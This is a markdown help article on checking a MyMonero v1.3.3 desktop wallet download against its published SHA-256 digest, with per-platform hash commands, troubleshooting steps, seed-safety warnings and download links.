<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Verify a MyMonero Download with SHA-256</h1>
<p align="center">Compare the file you downloaded with the release page before opening it.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A SHA-256 integrity check compares a digest calculated from your downloaded file with the digest published on the GitHub release page. For MyMonero, use the final desktop release v1.3.3 and do not run the file if the values differ.


Prefer reading on the web? The [MyMonero migration scams page](https://mymonero.info/mymonero-migration-scams) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.

## You'll see this if
- You downloaded the MyMonero desktop application and want to check the file before opening it.
- The release page shows a SHA-256 value but you are unsure how to calculate one.
- You see instructions using `shasum`, `sha256sum`, or `certutil` and need the right command for your system.
- A file has a different name or digest from what you expected.
- Someone sent you an installer or checksum outside the project release page.

## Why it happens
A downloaded file can be incomplete or altered in transit or copied from a source other than the one you intended. SHA-256 produces a fingerprint for a file. Comparing the locally calculated fingerprint with the value published on the release page can help establish that the bytes match that published file. It does not prove the software is safe in every sense, nor does it replace careful source checking.

MyMonero’s final desktop release is v1.3.3 on GitHub under monero-projects. Its release formats are Windows .exe, macOS .dmg, and Linux .zip. Use the value on the release page for the exact file you downloaded; different files have different digests. The old app still opens wallets and sends XMR, but it is no longer maintained and gets no new features or security updates. MyMonero hosted servers and web wallet login stopped. Learn about [installing MyMonero on Linux](./install-mymonero-linux.md) or visit [the release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) and [the app repository](https://github.com/monero-projects/mymonero-desktop-wallet).

---

## Fix
1. **Navigate to the official release.** Open the MyMonero desktop wallet project’s GitHub release page directly. Locate v1.3.3 and identify the exact platform file you downloaded. Do not use a checksum from a forum, search result snippet, private message, or a page with a similar name.
2. **Find the published SHA-256.** The release page may list a digest alongside an asset or in its release information. Select the value for the exact asset—Windows .exe, macOS .dmg, or Linux .zip. Do not copy a digest belonging to a different file. If no corresponding value is available, do not invent one or use a value supplied by an unknown person.
3. **Open the appropriate command tool.** On Windows, use Command Prompt or PowerShell and run `certutil -hashfile <file> SHA256`. On macOS, use Terminal and run `shasum -a 256 <file>`. On Linux, use a terminal and run `sha256sum <file>`. Replace `<file>` with the downloaded filename, including its location if the terminal is not already in that folder. The angle brackets in this example are placeholders, not characters to type.
4. **Read the output.** Each command prints a SHA-256 digest for the file. Some commands also print the filename or algorithm label. Compare the digest characters with the release page’s value. Letter case is not significant, but every digit and letter must match. Ignore surrounding labels, spaces, and the filename; compare the digest itself.
5. **Decide before opening.** If the values match, you have confirmed that your local file matches the published digest for that asset. You may continue with the normal installation steps, while remembering that a matching digest is an integrity check, not a security guarantee. If the values do not match, do not open or install the file.
6. **Re-download if needed.** Delete or quarantine the mismatched download, then get a fresh copy from the official release page and repeat the comparison. Ensure you selected the matching platform file and release. If the value remains different, leave the file unused and seek clarification from the project’s release information.
7. **Keep a record.** If it helps you manage several downloads, note the release version, asset name, and whether the digest matched. Do not publish wallet credentials or personal information with that note.

> [!TIP]
> Calculate the digest only after the download is complete. A partial file will have a different digest even if the transfer was simply interrupted.

> [!WARNING]
> A checksum does not tell you whether a file is a fake if you got both the file and the checksum from the same fake source. Start from the project’s GitHub release page, and never provide a seed to verify a download.

## If that did not work
If the command says it cannot find the file, confirm the exact filename and folder. You can drag the file into the terminal window to insert its path on many systems, but review the command before pressing Enter. Avoid pasting commands from unsolicited messages. Use the platform-specific command above and make sure the filename is the MyMonero asset you intended to check.

If your shell reports that the command is unavailable, use another built-in method or a reputable system-provided tool. Do not download an unknown “checksum checker” from a pop-up. The standard commands listed above are suitable for the specified platforms. For file paths containing spaces, quote the path according to your shell’s normal syntax; if uncertain, use the file manager’s copy-path feature and consult its built-in help.

If the computed value differs, verify that you have not compared the wrong asset or accidentally copied a truncated value. Repeat with a new download from the release page. A mismatch is a reason to stop, not a reason to disable system protections. Do not rely on a claim that the mismatch is harmless unless the release information itself resolves it.

A digest match cannot guarantee that the application has ongoing support. MyMonero v1.3.3 is the final desktop release and is no longer maintained. The old desktop app still opens wallets and sends XMR, but there are no new features or security updates. Hosted servers and web wallet login stopped. You can keep using the desktop app or consider restoring your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. For wallet recovery choices, see [how to restore a MyMonero wallet](./restore-mymonero-wallet.md).

## Prevention
Check the release page before every download, not an old bookmark to a third-party file. Make sure the version, platform asset, and digest correspond. Keep the downloaded release and its source reference together until you are satisfied the check is complete. A hash copied from a message is not a substitute for the value shown by the project release page.

Separate installation checks from wallet recovery. The digest tool does not need your seed, private view key, private spend key, password, or wallet file. If a person or website asks for any of those in exchange for a checksum, stop communicating. Back up your seed securely and use [the safe backup guide](./mymonero-backup-seed-safely.md). If you later need to restore, make sure you understand the difference between 13- and 25-word seeds.

## FAQ
<details><summary>Does a matching checksum mean the app is completely safe?</summary>

No. It confirms that the downloaded file matches the digest published for that asset. It does not establish ongoing maintenance or guarantee every aspect of software safety.

</details>

<details><summary>Which checksum should I compare?</summary>

Use the SHA-256 value associated with the exact asset on the official MyMonero v1.3.3 release page.

</details>

<details><summary>What if the values do not match?</summary>

Do not run the file. Download it again from the project release page and compare again; if it still differs, leave it unused.

</details>

<details><summary>Does the checksum need my seed?</summary>

No. A file integrity check does not use wallet information. Never disclose your seed or keys to verify a download.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [How to Use MyMonero Desktop](./how-to-use-mymonero-desktop.md) | What the final desktop app can still do, and how to use it with care. |
| [Send XMR with MyMonero](./mymonero-send-xmr.md) | Verify the recipient, amount, and fee before confirming a transaction. |
| [Withdraw XMR From MyMonero to an Exchange](./mymonero-withdraw-to-exchange.md) | How to send Monero safely from the desktop wallet to an exchange deposit address. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
